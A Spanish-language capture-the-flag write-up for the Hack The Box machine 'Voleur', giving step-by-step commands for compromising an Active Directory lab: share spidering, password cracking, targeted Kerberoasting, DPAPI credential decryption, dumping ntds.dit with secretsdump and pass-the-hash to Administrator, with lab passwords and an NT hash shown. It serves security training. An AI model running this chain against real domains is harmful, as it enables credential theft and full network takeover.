---
tags:
title: Voleur - Medium (HTB)
permalink: /Voleur-HTB-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Reconocimiento

Empezamos por un escaneo con [[Nmap]] para  ver que puertos y servicios estan abiertos.

<img width="661" height="558" alt="image" src="https://github.com/zs1n/Pentesting/blob/main/content/posts/images/Pasted image 20250805193710.png" />


Luego con `nxc` enumeramos el servicio `SMB` donde con el modulo `spider_plus` de `nxc` podemos enumerar archivos compartidos a nivel de red ("Shares") y listar archivos sensible los cuales podamos leer

```bash
nxc smb dc.voleur.htb -u 'ryan.naylor' -p 'HollowOct31Nyt' -M spider_plus -k
```

<img width="661" height="558" alt="image" src="https://github.com/zs1n/Pentesting/blob/main/content/posts/images/Pasted image 20250805193756.png" />


Como vemos que tenemos permisos de lectura en el share `IT` lo listamos y nos descargamos los archivos `excel` dentro de el.

```bash
nxc smb dc.voleur.htb -u 'ryan.naylor' -p 'HollowOct31Nyt' --share 'IT' --get-file 'First-Line Support/Access.Review.xlsx' 'Access.Review.xlsx' -k
```

<img width="661" height="558" alt="image" src="https://github.com/zs1n/Pentesting/blob/main/content/posts/images/Pasted image 20250805193810.png" />


Hay un archivo Excel el cual tiene una password, para crackearla hacemos lo siguiente.

```bash 
/usr/share/john/office2john.py Access_Review.xls > hash.txt
```

```bash 
john hash.txt w=/usr/share/worldlist/rockyou.txt
```

Donde conseguimos la siguiente password `football1`.

Abrimos el archivo con `libreoffice`.

```bash 
libreoffice --calc Access_Review.xls
```

<img width="661" height="558" alt="image" src="https://github.com/zs1n/Pentesting/blob/main/content/posts/images/Pasted image 20250713133931.png" />


`svc_ldap:M1XyC9pW7qT5Vn`


---

<img width="661" height="558" alt="image" src="https://github.com/zs1n/Pentesting/blob/main/content/posts/images/Pasted image 20250711212624.png" />


Primero pasamos a solicitar un TGT para el user que tenemos (SVC_LDAP) para exportar el .ccache y asi poder realizar un [[AS-REP Roast Attack]] contra el usuario *svc_winrm*.

```bash 
impacket-GetTGT voleur.htb/svc_ldap:M1XyC9pW7qT5Vn -dc-ip 10.10.11.76
```
Para exportarlo.
```bash 
export KRB5CCNAME=svc_ldap.ccache
```

Ahora pasamos a perfomar el ataque. 

```bash 
python3 targetedKerberoast.py -v -u 'svc_ldap' -p 'M1XyC9pW7qT5Vn' -d 'voleur.htb' -k --dc-host 'dc.voleur.htb'
```

<img width="661" height="558" alt="image" src="https://github.com/zs1n/Pentesting/blob/main/content/posts/images/Pasted image 20250711212942.png" />

Podemos ver varios hashes NetNTLMv2 para varios usuarios el cual del hash del user (*svc_winrm*) al crackearlo. 

```python
nvim hash 
john hash -w=/usr/share/wordlists/rockyou.txt
```

Y Obtenemos su password "AFireInsidedeOzarctica980219afi".

Lo siguiente exportamos el TGT a la variable KRB5CCNAME para poder auntenticarnos por kerberos.
```bash 
impacket-GetTGT voleur.htb/svc_winrm:AFireInsidedeOzarctica980219afi -dc-ip 10.10.11.76
export KRB5CCNAME=svc_winrm.ccache
```

---

## USER FLAG 

```bash 
evil-winrim -i 10.10.11.76 -u 'svc_winrm' -p 'AFireInsidedeOzarctica980219afi' -r voleur.htb
```

```BASH 
type user.txt
```

Haciendo reconocimiento vemos que hay un user eliminado del dominio el cual es. 
`Todd.Wolfe`

Por lo que necesitamos reestablecerlo con el usuario `svc_ldap` para poder entrar a la carpeta IT/Second-Line asi:

```powershell
$SecPassword = ConvertTo-SecureString 'M1XyC9pW7qT5Vn' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('voleur.htb\svc_ldap', $SecPassword)
Get-ADObject -Filter {Deleted -eq $true -and ObjectClass -eq "user"} -IncludeDeletedObjects -Credential $Cred
Restore-ADObject -Identity 1c6b1deb-c372-4cbb-87b1-15031de169db -Credential $Cred
```

Nos conectamos via SMB para enumerar la carpeta IT/Second-Line Support

```bash 
impacket-smbclient voleur.htb/todd.wolfe:NightT1meP1dg3on14@10.10.11.76 -dc-ip 10.10.11.76 -k
```

<img width="661" height="558" alt="image" src="https://github.com/zs1n/Pentesting/blob/main/content/posts/images/Pasted image 20250713002300.png" />


<img width="661" height="558" alt="image" src="https://github.com/zs1n/Pentesting/blob/main/content/posts/images/Pasted image 20250713002325.png" />


``Donde en la primera foto podemos ver el SID del usuario y en la foto de abajo el archivo con la masterkey a descifrar``

```bash
impacket-dpapi masterkey -f 08949382-134f-4c63-b93c-ce52efc0aa88 -sid S-1-5-21-3927696377-1337352550-2781715495-1110 -password 'NightT1meP1dg3on14'
impacket-dpapi masterkey -f <MASTERKEY> -sid <SID> -password <PASSWORD

```

<img width="661" height="558" alt="image" src="https://github.com/zs1n/Pentesting/blob/main/content/posts/images/Pasted image 20250713132321.png" />


Luego pasamos a decriptar los hashes dpapi.

```bash 
 impacket-dpapi credential -f 772275FAD58525253490A9B0039791D3 -k 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83
```

<img width="661" height="558" alt="image" src="https://github.com/zs1n/Pentesting/blob/main/content/posts/images/Pasted image 20250713002340.png" />


Pasamos a pedir un TGT Para el usuario *jeremy.,combs* para poder enumerar por *impacket-smbclient* su carpeta.

```bash
impacket-getTGT voleur.htb/jeremy.combs:qT3V9pLXyN7W4m -dc-ip 10.10.11.76
export KRB5CCNAME=jeremy.combs.ccache
```

```bash 
impacket-smbclient voleur.htb/jeremy.combs:qT3V9pLXyN7W4m -dc-ip 10.10.11.76 -k 
```

Donde podemos apreciar una clave id_rsa para el usuario *svc_backup*.

<img width="661" height="558" alt="image" src="https://github.com/zs1n/Pentesting/blob/main/content/posts/images/Pasted image 20250713002724.png" />


Nos conectamos  via ssh por el puerto 2222 con el user (*svc_backup*).

```bash 
ssh svc_backup@10.10.11.76 -i /home/zsln/Desktop/zsln/htb/voleur/targetedKerberoast/id_rsa -p 2222
```

Si enumeramos las carpetas podemos ver que en la ruta */mnt/c/IT/Third-Line\ Support/Backups/Active\ Directory/* se encuentra el *ntds.dit* del sistema y en la ruta */mnt/c/IT/Third-Line\ Support/Backups/registry/* encontramos el archivo SYSTEM. 

Para pasar los archivos *ntds.dit y SYSTEM* hacemos lo siguiente.

```bash 
scp -i ~/.ssh/id_rsa_tmp -P 2222 "svc_backup@dc.voleur.htb:/mnt/c/IT/Third-Line\ Support/Backups/Active\ Directory/ntds.dit" ~/ntds.dit
scp -i ~/.ssh/id_rsa_tmp -P 2222 "svc_backup@dc.voleur.htb:/mnt/c/IT/Third-Line\ Support/Backups/registry/SYSTEM" ~/SYSTEM
```

Para que despues con `secretsdump` de `impacket` dumpeamos los hashes de todos los usuarios a nivel de dominio.

```bash 
impacket-getTGT voleur.htb/Administrator -hashes 'aad3b435b51404eeaad3b435b51404ee:e656e07c56d831611b577b160b259ad2' -dc-ip 10.10.11.76
 export KRB5CCNAME=Administrator.ccache
```

```bash
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
```

<img width="661" height="558" alt="image" src="https://github.com/zs1n/Pentesting/blob/main/content/posts/images/Pasted image 20250713013859.png" />


Como no podemos logearnos via [[EvilWinRM]] lo hacemos via [[impacket-wmiexec]].

```bash 
impacket-getTGT voleur.htb/Administrator -hashes 'aad3b435b51404eeaad3b435b51404ee:e656e07c56d831611b577b160b259ad2' -dc-ip 10.10.11.76
 export KRB5CCNAME=Administrator.ccache
```

```bash
impacket-wmiexec -hashes :e656e07c56d831611b577b160b259ad2 voleur.htb/Administrator@10.10.11.76 -k
```

<img width="661" height="558" alt="image" src="https://github.com/zs1n/Pentesting/blob/main/content/posts/images/Pasted image 20250713021455.png" />

 
 Donde ya podemos visualizar la flag del usuario Administrator.
 
 ```bash 
 type root.txt
```

`~Happy Hacking.`

